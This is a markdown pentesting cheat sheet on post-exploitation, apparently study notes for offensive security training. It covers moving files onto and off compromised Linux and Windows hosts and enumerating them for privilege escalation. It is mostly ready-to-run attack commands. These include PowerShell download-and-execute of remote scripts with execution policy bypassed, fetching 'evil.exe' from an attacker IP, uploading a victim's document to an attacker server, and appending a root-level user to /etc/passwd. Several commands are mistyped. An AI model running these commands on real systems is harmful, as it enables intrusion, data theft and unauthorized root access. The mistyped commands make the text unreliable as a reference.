# Post Exploitation

## **File Transfers**
### Linux
- TFTP
  ```bash
    kali@kali:~# mkdir /tftp
    kali@kali:~# atftpd --daemon --port 69 /tftp
    kali@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
    
    C:\Users\Bob>tftp -i 10.11.0.5 get nc.exe
    ```
- HTTP Server with Python 
  ```bash
    python -m SimpleHTTPServer [PORT] 
  ```
### Windows
- TFTP
  - Kali installation
  ```bash
  xonork@kali:~$ sudo apt update && sudo apt install atftp
  xonork@kali:~$ sudo mkdir /tftp
  xonork@kali:~$ sudo chown nobody: /tftp
  xonork@kali:~$ sudo atftpd --daemon --port 69 /tftp
  ```
  - Tranfer binary in Windows (-i flag for binary tranfers)
  ```bash
  C:\Users\xonork> tftp -i 10.11.0.4 put important.docx
  ```
- FTP
  - Non-Interactive FTP Download
    ```bash
    #In Kali we will set up a FTP server
    sudo cp /usr/share/windows-resources/binaries/nc.ese /ftphome/
    sudo systemctl restart pure-ftpd
    ```
    ```cmd
    #In Windows we create a file which the instructions to download nc.exe
    C:\Users\xonork>echo open 10.11.0.4 21> ftp.txt
    C:\Users\xonork>echo USER xonork>> ftp.txt
    C:\Users\xonork>echo mypass>> ftp.txt
    C:\Users\xonork>echo bin >> ftp.txt
    C:\Users\xonork>echo GET nc.exe >> ftp.txt
    C:\Users\xonork>echo bye >> ftp.txt
    ```
    ```cmd
    #Finally in Windows we execute the command
    C:\Users\xonork> ftp -v -n -s:ftp.txt
    ```
- VBS
  - HTTP Downloader
    ```cmd
    echo strUrl = WScript.Arguments.Item(0) > wget.vbs
    echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
    echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
    echo Err.Clear >> wget.vbs
    echo Set http = Nothing >> wget.vbs
    echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
    echo http.Open "GET", strURL, False >> wget.vbs
    echo http.Send >> wget.vbs
    echo varByteArray = http.ResponseBody >> wget.vbs
    echo Set http = Nothing >> wget.vbs
    echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
    echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
    echo strData = "" >> wget.vbs
    echo strBuffer = "" >> wget.vbs
    echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
    echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
    echo Next >> wget.vbs
    echo ts.Close >> wget.vbs
    ```
    ```cmd
    C:\Users\xonork> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
    ```
- PowerShell
  ```bash
    C:\Users\Bob> echo $storageDir = $pwd > wget.ps1
    C:\Users\Bob> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
    C:\Users\Bob> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
    C:\Users\Bob> echo $file = "new-exploit.exe" >>wget.ps1
    C:\Users\Bob> echo $webclient.DownloadFile($url,$file) >>wget.ps1
    #Finally we run the downloaded script
    C:\Users\Bob> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
  ```
  ```ps1
  powershell -c "(new-object System.net.WebCLient).DownloadFile('http://X.X.X.X/wget.exe','C:\Users\xonork\Desktop\wget.exe')"
  ```
  ```ps1
   powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
  ```
  - Download and execute in PowerShell
    ```ps1
      powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.23/exploit.ps1');
    ```
  - Download with exe2hex and PowerShell
    ```bash
    #In Kali
    cp /usr/share/windows-resources/binaries .
    #The, we will reduce the file size with upx
    upx -9 nc.exe
    #Finally, we will convert the to hex
    exe2hex -x nc.exe -p nc.cmd
    ```
    ```bash
    #In Windows
    C:\Users\offsec>powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
    ```
  - Upload file in Powershell
  ```bash
  powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
  ```
    
## **Privilege Escalation**
### General commands
  - **whoami**
  - **hostname**
### **Linux**

- **Manually**
  - More user information
    ```bash
    id
    ```
  - Enumerate users
    ```bash
    cat /etc/passwd
    ```
  - System Information
    ```bash
    # System identification
    cat /etc/issue
    ```
    ```bash
    cat /etc/*-release
    ```
    ```bash
    # Kernel Version
    uname -a
    ```
    ```bash
    # Architecture
    arch
    ```
  - Running Processes and Services
    ```bash
    ps aux
    ```
  - Network information
    ```bash
    ifconfig a
    ```
    ```bash
    ip a
    ```
    ```bash
    /sbin/route
    ```
    ```bash
    /sbin/outel
    ```
    ```bash
    netstat
    ```
    ```bash
    ss
    ```
  - Firewall Status and Rules
    ```bash
    iptables #we must be root :(
    ```
    ```bash
    cat /etc/iptables #sometimes regular users have access to this file
    ```
    - We can even search in **/etc** directory, the administrator could have used **iptables-save** (which dumps the firewall configuration to a file specified by the user.

  - Scheduled Tasks
    - Scheduled tasks are listed under the **/etc/cron.* directories.
    - Sometimes administrators add their scheduled tasks in the **/etc/crotab** file.
    ```bash
    grep "CRON" /var/log/cron.log
    ```

   - Installed Applications and Patch Levels
    ```bash
    dpkg -l
    #Debian-based Linux
    ```
    ```bash
    rpm -l
    #RedHat-based Linux
    ```
  - Readable/Writable Files and Directories
    ```bash
    find / -writable -type d 2>/deb/null
    ```
  - Unmounted Disks
    ```bash
    mount
    ```
    ```bash
    cat /etc/fstab
    #Lists all drives that will be mounted at boot time
    ```
    ```bash
    #Lists loaded kernel modules
    /bin/lsblk
    ```
   - Device Drivers and Kernel Modules
    ```bash
    lsmod
    ```
    ```bash
    /sbin/modinfo [module name]
    ```
  - Binaries That AutoElevate
    - Normally, when running an executable, it inherits the permissions of the user that runs it. However, if the SUID permissions are set. the binary will run with the permissions of the file owner. This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges.
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```
  - Write in /etc/passwd
    - If a password has is peresnt at the second column of `/etc/passwd`, it is considered valid for authentication. It means that if we have permission to write into the file, we can set the password for any user. Also we can modify de UID and GUID (zero for root).
    ```bash
    xonork@xonork ~ openssl passwd test
    a96sb9Hrowj0c
    
    xonork@xonork ~  echo "root2:a96sb9Hrowj0c:0:0:root:/root:/bin/bash" >> /etc/passwd
    ```
- **Automated**
  - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  - [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  - [Linux Smart Enum](https://github.com/diego-treitos/linux-smart-enumeration)
  - [LinEnum](https://github.com/rebootuser/LinEnum)
  - [BeRoot](https://github.com/AlessandroZ/BeRoot)
  - [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
  - [Unix Privesc Check](https://github.com/pentestmonkey/unix-privesc-check)
  - [Privilage Escalation through sudo](https://github.com/TH3xACE/SUDO_KILLER)
  - [GTFOBins](https://gtfobins.github.io/)

### **Windows**

- **Manually**
  - More user information
    ```bash
    net user <USER>
    ```
    It gaves us more information about the target as which groups the user belongs to.
    ```bash
    whoami /priv
    ```
  - Discover more users
    ```bash
    net user
    ```
  - System information
    ```bash
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
    ```
  - Running Processes and Services
    ```bash
    tasklist /SVC
    ```
    ```bash
    Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
    ```
    
  - Network information
    ```bash
    ipconfig /all
    ```
    ```bash
    route print
    ```
    ```bash
    netstat -ano
    ```
  - Firewall Status and Rules
    ```bash
    netsh advfirewall show currentprofile
    ```
    ```bash
    netsh advfirewall show rule name=all
    ```
  - Scheduled Tasks
    ```bash
    schtasks /query /fo LIST /v
    ```
  - Installed Applications and Patch Levels
    ```bash
    wmic product get name, version, vendor
    #Lists software installed by the Microsoft Installer
    ```
    ```bash
    wmic qfe get Caption, Description, HotFixID, InstalledOn
    ```
  - Readable/Writable Files and Directories
    ```bash
    accesschk.exe -uws "Everyone" "C:\Program Files"
    ```
    ```bash
    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
    ```
  - Unmounted Disks
    ```bash
    mountvol
    ```
  - Device Drivers and Kernel Modules
    ```bash
    #In cmd
    driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
    ```
    ```bash
    #In cmd
    driverquery /v
    ```
    ```bash
    #In powershell
    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "VMware*"}
  - Binaries That AutoElevate
    - In Windows systems, we should check the status of the *AlwaysInstallElevated* registry setting. If this key is enabled (set to 1) in either *HKEY_CURRENT_USER* or *HKEY_LOCAL_MACHINE*, any user can run Windows Installer packages with elevated privileges. If rhis setting is enabled, we could craft an *MSI* file and run it to elevate privileges.
    ```bash
    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    ```
    ```bash
    reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    ```
  - File Security Identifiers (SIDs)
    | Mask | Permissions |
    |------|-------------|
    | F | Full access |
    | M | Modify access |
    | RX | Read and execute access |
    | W | Write-only access |
    
    - Enumerate file SIDs
      ```bash
      icacls "C:\Program Files\Test\bin\binary.exe
      ```
    
- **Automated**
  - [PowerSploit's Power Up](https://github.com/PowerShellMafia/PowerSploit)
  - [Watson](https://github.com/rasta-mouse/Watson)
  - [Sherlock](https://github.com/rasta-mouse/Sherlock)
  - [BeRoot](https://github.com/AlessandroZ/BeRoot)
  - [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
  - [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
  - [Windows Exploits](https://github.com/abatchy17/WindowsExploits)
  - [Windows Enum](https://github.com/absolomb/WindowsEnum)
  - [SeatBelt](https://github.com/GhostPack/Seatbelt)
  - [Powerless](https://github.com/M4ximuss/Powerless)
  - [JAWS](https://github.com/411Hall/JAWS)
  - [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
  - [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
  - [Privesc Check](https://github.com/itm4n/PrivescCheck)
